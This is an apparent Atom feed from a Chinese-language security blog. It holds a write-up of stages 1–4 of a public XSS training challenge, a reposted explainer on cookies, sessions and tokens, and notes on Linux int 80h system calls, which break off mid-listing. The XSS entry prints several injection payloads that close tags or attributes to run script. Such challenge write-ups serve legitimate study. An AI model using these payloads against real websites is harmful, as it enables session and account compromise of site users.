<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2019-11-19T12:23:32.633Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>（XSS Challenge）Stage#1-#4 writeup</title>
    <link href="https://muzibing.github.io/2019/11/19/2019.11.19%EF%BC%8889%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/19/2019.11.19（89）/</id>
    <published>2019-11-18T16:00:00.000Z</published>
    <updated>2019-11-19T12:23:32.633Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目链接：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges（共19关）</a></p></blockquote><h3 id="font-colorbrownstage-1font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-1font"></a> <font color="brown">Stage #1</font></h3><h4 id="font-colornavy1-题目font"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-1.png" alt></p><h4 id="font-colornavy2-相关知识点font"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>XSS 的类型</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 首先看一下是否存在 XSS 攻击</p><p><img src="/images/89-2.png" alt></p><p>⚁ 首次尝试填入信息：</p><p><img src="/images/89-3.png" alt></p><p>▣ 可以从上图中看出，我们写入的 <code>Hello World</code> 被放在了 <code>&lt;b&gt; &lt;/b&gt;</code> 标签中，我们可以在这个标签中进行 <code>xss</code> 攻击，脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/ 之所以用 document.domain 是因为题目中的提示</span></span><br></pre></td></tr></table></figure><blockquote><p>▣ 点击 <code>search</code> 之后，窗口会给我们弹出一个提示框，如下：</p><p><img src="/images/89-4.png" alt></p><p>这就代表着我们成功的对该网页进行了 <code>xss</code> 攻击，下面让我们看一下源码，看一下浏览器是怎么渲染我们的输入：</p><p><img src="/images/89-5.png" alt></p></blockquote><h3 id="font-colorbrownstage-2font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-2font"></a> <font color="brown">Stage #2</font></h3><h4 id="font-colornavy1-题目font-2"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-2"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-6.png" alt></p><h4 id="font-colornavy2-相关知识点font-2"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-2"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>close the current tag and add SCRIPT tag…</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-2"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-2"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初尝试：先输入数据，看看网页源码<br><img src="/images/89-7.png" alt></p><p>▣ 从上图可以看出，我们输入的 <code>Hello World</code> 赋值给了 <code>&lt;input&gt;</code> 标签的 <code>value</code> 值，那么我们根据提示和第一次的尝试，可以对 <code>value</code> 标签进行闭合，然后进行 <code>xss</code> 攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1: <span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-8.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2: <span class="string">" onclick/onmouseoover=alert(document.domain)&gt;//</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-9,png" alt></p><blockquote><p>在这里简单的介绍一下 <code>onclick</code>、<code>onmousedown</code>、<code>onmouseup</code>、<code>onmouseout</code>、<code>onmouseenter</code>、<code>onmouseleave</code>  和  <code>onmouseover</code>  的功能：</p><ul><li><code>onclick</code> ：在鼠标左健点击弹起之后触发的事件，即一次完整的鼠标点击过程。过程完成瞬间触发函数</li><li><code>onmouseover</code> ：属性在鼠标指针移动到元素上时触发</li><li><code>onmousedown</code> ：事件会在鼠标按键被按下时发生</li><li><code>onmouseup</code> ：事件会在松开鼠标按键时触发</li><li><code>onmouseout</code> ：属性在鼠标指针移动到元素外时触发</li><li><code>onmouseenter</code> ：属性在鼠标指针移动到元素上时触发，onmouseover和onmouseenter唯一的区别是 onmouseenter 事件不支持冒泡</li><li><code>onmouseleave</code> ：性在鼠标指针移动到元素外时触发， onmouseout和onmouseleave唯一的区别是 onmouseleave 事件不支持冒泡 。</li></ul></blockquote><h3 id="font-colorbrownstage-3font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-3font"></a> <font color="brown">Stage #3</font></h3><h4 id="font-colornavy1-题目font-3"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-3"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-10.png" alt></p><h4 id="font-colornavy2-相关知识点font-3"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-3"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>The input in text box is properly escaped.</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-3"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-3"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初试 <code>Hello World</code> ：</p><p><img src="/images/89-11.png" alt></p><p>▣ 从上图可以看到，我们输入 <code>Hello World</code> 以后，网页显示了两个内容：</p><p>       <code>&lt;b&gt; &quot;Hellow World&quot; &lt;/b&gt;</code></p><p>       <code>&lt;b&gt; Japan &lt;/b&gt;</code></p><p>我们先尝试对第一处的进行标签闭合，如下图：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-12.png" alt></p><p>▣ 我们从上图看到，我们的 payload 没有被执行，说明该处不能够进行 xss 攻击，那么我们尝试修改第二处的值，也就是 <code>Japan</code> 的值（这个的实现我们可以用 <code>burp</code> 工具进行）：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain&gt;&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-13.png" alt></p><p>▣ 从下图的源码可以看到我们成功的执行了我们的脚本：</p><p><img src="/images/89-14.png" alt></p></blockquote><h3 id="font-colorbrownstage-4font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-4font"></a> <font color="brown">Stage #4</font></h3><h4 id="font-colornavy1-题目font-4"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-4"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-15.png" alt></p><h4 id="font-colornavy2-相关知识点font-4"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-4"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>invisible input field</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-4"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-4"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 我们可以看出，这道题目和上一道题目没有太大的区别，我们再通过 <code>burp</code> 对 <code>&lt;b&gt;</code> 两处可能存在的 <code>xss</code> 攻击进行尝试构建我们的脚本：</p><p><img src="/images/89-16.png" alt></p><p>执行结果如下:</p><p><img src="/images/89-17.png" alt></p><p>▣ 我们在两处都写入了我们的脚本，但是都没有被执行，在用 <code>burp</code> 抓包的过程中，我们发现，这道题比上一道题多了一个 <code>Hack</code>，那么我们是不是可以通过这个来实现 <code>xss</code> 攻击呢？我们先看一下 <code>Hack</code> 在页面哪个位置，如下图：</p><p><img src="/images/89-18.png" alt></p><blockquote><p>☛ 在这里我们补充一个知识点：<code>input</code> 的 <code>type</code> 属性</p><p>          ● <code>button</code>：定义可点击按钮（多数情况下，用于通过 JavaScript 启动脚本）</p><p>          ● <code>checkbox</code>：定义复选框</p><p>          ● <code>file</code>：定义输入字段和 &quot;浏览&quot;按钮，供文件上传</p><p>          ● <code>hidden</code>：定义隐藏的输入字段</p><p>          ● <code>image</code>： 定义图像形式的提交按钮</p><p>          ● <code>password</code>：定义密码字段。该字段中的字符被掩码</p><p>          ● <code>radio</code>：定义单选按钮</p><p>          ● <code>reset</code>：定义重置按钮。重置按钮会清除表单中的所有数据</p><p>          ● <code>submit</code>：定义提交按钮。提交按钮会把表单数据发送到服务器</p><p>          ● <code>text</code>：定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符</p></blockquote><p>▣ 从上图我们可以得到，有一个 <code>&lt;input&gt;</code> 标签被隐藏掉了，所以我们在网页中无法找见它，但是我们可以在 <code>burp</code> 改包，来进行 <code>xss</code>  攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>效果如下图：</p><p><img src="/images/89-19.png" alt></p><p>▣ 我们点击 <code>Forward</code> 以后，可以看到我们成功的执行了 <code>xss</code> 攻击：</p><p><img src="/images/89-20.png" alt></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;题目链接：&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS Challenges（共19关）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Cookie、Session、Token那点事儿（转载）</title>
    <link href="https://muzibing.github.io/2019/11/07/2019.11.07%EF%BC%8888%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/07/2019.11.07（88）/</id>
    <published>2019-11-06T16:00:00.000Z</published>
    <updated>2019-11-07T05:13:11.297Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>来自：简书，作者：骑小猪看流星</strong></p><p>链接：<a href="https://www.jianshu.com/p/bd1be47a16c1" target="_blank" rel="noopener">https://www.jianshu.com/p/bd1be47a16c1</a></p></blockquote><h3 id="font-color-brown一-什么是cookiefont"><a class="markdownIt-Anchor" href="#font-color-brown一-什么是cookiefont"></a> <font color="brown">一、什么是Cookie？</font></h3><blockquote><p>Cookie 技术产生源于 HTTP 协议在互联网上的急速发展。随着互联网时代的策马奔腾，带宽等限制不存在了，人们需要更复杂的互联网交互活动，就必须同服务器保持活动状态（简称：保活）。</p><p><br>于是，在浏览器发展初期，为了适应用户的需求技术上推出了各种保持 Web 浏览状态的手段，其中就包括了 Cookie 技术。Cookie 在计算机中是个存储在浏览器目录中的文本文件，当浏览器运行时，存储在 RAM 中发挥作用 （此种 Cookies 称作 Session Cookies），一旦用户从该网站或服务器退出，Cookie 可存储在用户本地的硬盘上 （此种 Cookies 称作 Persistent Cookies）。</p><p><br>Cookie 起源：1993 年，网景公司雇员 Lou Montulli 为了让用户在访问某网站时，进一步提高访问速度，同时也为了进一步实现个人化网络，发明了今天广泛使用的 Cookie。（所以，适当的偷懒也会促进人类计算机发展史的一小步~）</p><p><br>Cookie时效性：目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p><p><br>Cookie使用限制：Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。</p><p><br>执行流程：</p><blockquote><p>A：首先，客户端会发送一个http请求到服务器端。</p><p>B： 服务器端接受客户端请求后，发送一个http响应到客户端，这个响应头，其中就包含Set-Cookie头部。</p><p>C：在客户端发起的第二次请求（注意：如果服务器需要我们带上Cookie，我们就需要在B步骤上面拿到这个Cookie然后作为请求头一起发起第二次请求），提供给了服务器端可以用来唯一标识客户端身份的信息。这时，服务器端也就可以判断客户端是否启用了cookies。尽管，用户可能在和应用程序交互的过程中突然禁用cookies的使用，但是，这个情况基本是不太可能发生的，所以可以不加以考虑，这在实践中也被证明是对的。</p></blockquote><p><br>为了方便理解，可以先看下这张流程执行图加深概念:</p><p><img src="/images/88-1.png" alt></p><p>那么，在浏览器上面的请求头和Cookie在那？下图给大家截取了其中一种:</p><p><img src="/images/88-2.png" alt></p></blockquote><h3 id="font-color-brown二-sessionfont"><a class="markdownIt-Anchor" href="#font-color-brown二-sessionfont"></a> <font color="brown">二、Session</font></h3><blockquote><p>Session是对于服务端来说的，客户端是没有Session一说的。Session是服务器在和客户端建立连接时添加客户端连接标志，最终会在服务器软件（Apache、Tomcat、JBoss）转化为一个临时Cookie发送给给客户端，当客户端第一请求时服务器会检查是否携带了这个Session（临时Cookie），如果没有则会添加Session，如果有就拿出这个Session来做相关操作。</p><p><br>在这里引用别人家的一个小故事来加深印象：</p><blockquote><p>在说session是啥之前，我们先来说说为什么会出现session会话，它出现的机理是什么？</p><p><br>我们知道，我们用浏览器打开一个网页，用到的是HTTP协议，了解计算机的应该都知道这个协议，它是无状态的，什么是无状态呢？就是说这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但是这种无状态的的好处是快速。所以就会带来一个问题就是，我希望几个请求的页面要有关联，比如：<a href="http://xn--www-lp6eu21c.a.com/login.php%E9%87%8C%E9%9D%A2%E7%99%BB%E9%99%86%E4%BA%86%EF%BC%8C%E6%88%91%E5%9C%A8www.a.com/index.php" target="_blank" rel="noopener">我在www.a.com/login.php里面登陆了，我在www.a.com/index.php</a> 也希望是登陆状态，但是，这是2个不同的页面，也就是2个不同的HTTP请求，这2个HTTP请求是无状态的，也就是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了！</p><p><br>那咋搞呢？我不可能这2个页面我都去登陆一遍吧。或者用笨方法这2个页面都去查询数据库，如果有登陆状态，就判断是登陆的了。这种查询数据库的方案虽然可行，但是每次都要去查询数据库不是个事，会造成数据库的压力。所以正是这种诉求，这个时候，一个新的客户端存储数据方式出现了：cookie。cookie是把少量的信息存储在用户自己的电脑上，它在一个域名下是一个全局的，只要设置它的存储路径在域名www.a.com下 ，那么当用户用浏览器访问时，php就可以从这个域名的任意页面读取cookie中的信息。<a href="http://xn--www-0h9d0q42lp0lnue67gktjcih6pax98svx0c.a.com/login.php%E9%A1%B5%E9%9D%A2%E7%99%BB%E9%99%86%E4%BA%86%EF%BC%8C%E6%88%91%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%9C%A8www.a.com/index.php%E8%8E%B7%E5%8F%96%E5%88%B0%E8%BF%99%E4%B8%AA%E7%99%BB%E9%99%86%E4%BF%A1%E6%81%AF%E4%BA%86%E3%80%82" target="_blank" rel="noopener">所以就很好的解决了我在www.a.com/login.php页面登陆了，我也可以在www.a.com/index.php获取到这个登陆信息了。</a></p><p><br>同时又不用反复去查询数据库。虽然这种方案很不错，也很快速方便，但是由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session 诞生了。</p><p><br> Session 就是在一次会话中解决2次HTTP的请求的关联，让它们产生联系，让2两个页面都能读取到找个这个全局的session信息。session信息存在于服务器端，所以也就很好的解决了安全问题。</p></blockquote></blockquote><h3 id="font-color-brown三-tokenfont"><a class="markdownIt-Anchor" href="#font-color-brown三-tokenfont"></a> <font color="brown">三、Token</font></h3><blockquote><p>token是用户身份的验证方式，我们通常叫它：令牌。最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。还可以把不变的参数也放进token，避免多次查库。</p><p><br>应用场景：</p><p><br>A：当用户首次登录成功（注册也是一种可以适用的场景）之后, 服务器端就会生成一个 token 值，这个值，会在服务器保存token值(保存在数据库中)，再将这个token值返回给客户端.</p><p>B：客户端拿到 token 值之后,进行本地保存。（SP存储是大家能够比较支持和易于理解操作的存储）</p><p>C：当客户端再次发送网络请求(一般不是登录请求)的时候,就会将这个 token 值附带到参数中发送给服务器.</p><p>D：服务器接收到客户端的请求之后,会取出token值与保存在本地(数据库)中的token值做对比</p><p><br>对比一：如果两个 token 值相同， 说明用户登录成功过!当前用户处于登录状态!</p><p>对比二：如果没有这个 token 值, 则说明没有登录成功.</p><p>对比三：如果 token 值不同: 说明原来的登录信息已经失效,让用户重新登录.</p></blockquote><h3 id="font-color-brown四-三者的区别font"><a class="markdownIt-Anchor" href="#font-color-brown四-三者的区别font"></a> <font color="brown">四、三者的区别</font></h3><h4 id="font-color-navy1-cookie和session的区别font"><a class="markdownIt-Anchor" href="#font-color-navy1-cookie和session的区别font"></a> <font color="navy">1. Cookie和Session的区别</font></h4><blockquote><ol><li>cookie数据存放在客户的浏览器上，session数据放在服务器上。</li><li>cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗,考虑到安全应当使用session。</li><li>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能,考虑到减轻服务器性能方面，应当使用cookie。</li><li>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</li><li>所以个人建议：<ul><li>将登陆信息等重要信息存放为session</li><li>其他信息如果需要保留，可以放在cookie中</li></ul></li></ol></blockquote><h4 id="font-color-navy2-token-和-session-的区别font"><a class="markdownIt-Anchor" href="#font-color-navy2-token-和-session-的区别font"></a> <font color="navy">2. Token 和 Session 的区别</font></h4><blockquote><p>Session和 token并不矛盾，作为身份认证token安全性比session好，因为每个请求都有签名还能防止监听以及重放攻击，而session就必须靠链路层来保障通讯安全了。如上所说，如果你需要实现有状态的会话，仍然可以增加session来在服务器端保存一些状态。</p><p><br>App通常用restful api跟server打交道。Rest是stateless的，也就是app不需要像browser那样用cookie来保存session,因此用session token来标示自己就够了，session/state由api server的逻辑处理。如果你的后端不是stateless的rest api,那么你可能需要在app里保存session.可以在app里嵌入webkit,用一个隐藏的browser来管理cookie session.</p><p><br>Session是一种HTTP存储机制，目的是为无状态的HTTP提供的持久机制。所谓Session认证只是简单的把User信息存储到Session里，因为SID的不可预测性，暂且认为是安全的。这是一种认证手段。而Token，如果指的是OAuth Token或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对App。其目的是让 某App有权利访问 某用户 的信息。这里的Token是唯一的。不可以转移到其它App上，也不可以转到其它 用户 上。转过来说Session。Session只提供一种简单的认证，即有此SID，即认为有此User的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方App。所以简单来说，如果你的用户数据可能需要和第三方共享，或者允许第三方调用API接口，用Token。如果永远只是自己的网站，自己的App，用什么就无所谓了。</p><p><br>token就是令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件；cookie就是写在客户端的一个txt文件，里面包括你登录信息之类的，这样你下次在登录某个网站，就会自动调用cookie自动登录用户名；session和cookie差不多，只是session是写在服务器端的文件，也需要在客户端写入cookie文件，但是文件里是你的浏览器编号.Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p></blockquote><h3 id="font-color-brown四-相关文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-相关文章font"></a> <font color="brown">四、相关文章</font></h3><blockquote><ol><li><a href="https://mp.weixin.qq.com/s/b8h6_3CMlwsE8PtkrPr9FA" target="_blank" rel="noopener">Cookie、Session、Token那点事儿</a></li><li><a href="https://segmentfault.com/a/1190000017831088" target="_blank" rel="noopener">彻底弄懂session，cookie，token</a></li><li><a href="https://www.cnblogs.com/hwlong/p/9224251.html" target="_blank" rel="noopener">★★★★  Cookie、Session、Token  ★★★★</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;来自：简书，作者：骑小猪看流星&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;https://www.jianshu.com/p/bd1be47a16c1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>有关内核调用问题和预编译指令</title>
    <link href="https://muzibing.github.io/2019/11/05/2019.11.05%EF%BC%8887%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/05/2019.11.05（87）/</id>
    <published>2019-11-04T16:00:00.000Z</published>
    <updated>2019-11-06T03:58:12.597Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-知识点摘要font"><a class="markdownIt-Anchor" href="#font-color-brown一-知识点摘要font"></a> <font color="brown">一、知识点摘要</font></h3><blockquote><ol><li>系统调用 int 80h 中断</li><li>#ifdef ……# endif 的含义和用法</li></ol></blockquote><h3 id="font-color-brown二-知识点介绍font"><a class="markdownIt-Anchor" href="#font-color-brown二-知识点介绍font"></a> <font color="brown">二、知识点介绍</font></h3><h4 id="font-color-navy1int-80h-中断font"><a class="markdownIt-Anchor" href="#font-color-navy1int-80h-中断font"></a> <font color="navy">1.int 80h 中断</font></h4><blockquote><p><font color="orange">1) 什么是 system call?</font></p><p>        system call 是指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。system call 提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信 。(<a href="%5Bhttps://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%5D(https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F)">操作系统—WIKI</a>)</p><p><br><font color="orange">2) 什么是 int 80h 中断？</font></p><p>        Linux 的 system call 就是通过<code>int 80h</code>来实现的，<code>int 80h</code> 是通过<font color="red">系统调用号</font>来区分入口的函数。</p><p><br><font color="orange">3) 操作系统实现 <code>system call</code> 的基本过程:</font></p><p>        ①  应用程序调用库函数（API）；</p><p>        ②  API 将系统调用号存入 eax，然后通过中断调用使系统进入内核态；</p><p>        ③  内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p><p>        ④  系统调用完成相应功能，将返回值存入eax，返回到中断处理函数；</p><p>        ⑤  中断处理函数返回到 API 中；</p><p>        ⑥  API 将 eax 返回给应用程序。<br><br><font color="orange">4) 系统调用号</font></p><p>        我们再来想几个小问题：</p><p>            ※ 系统调用号定义在哪里？</p><p>              Linux 的系统调用号定义在了 <code>/usr/include/asm/unistd.h</code> 文件中，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta"># cat /usr/<span class="meta-keyword">include</span>/asm/unistd.h</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_H</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">/* x32 syscall flag bit */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __X32_SYSCALL_BIT0x40000000</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">ifdef</span> __i386__</span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_32.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">elif</span> defined(__ILP32__)</span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_x32.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_H */</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>              再来简单的看一下 <code>unistd_x32</code> 、<code>unisted_32</code>和 <code>unisted64</code> 中的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_x32.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_stat (__X32_SYSCALL_BIT + 4)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fstat (__X32_SYSCALL_BIT + 5)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lstat (__X32_SYSCALL_BIT + 6)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_poll (__X32_SYSCALL_BIT + 7)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lseek (__X32_SYSCALL_BIT + 8)</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt; </span><br><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_32.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_exit 1</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fork 2</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read 3</span></span><br><span class="line">&gt; <span class="meta">#<span 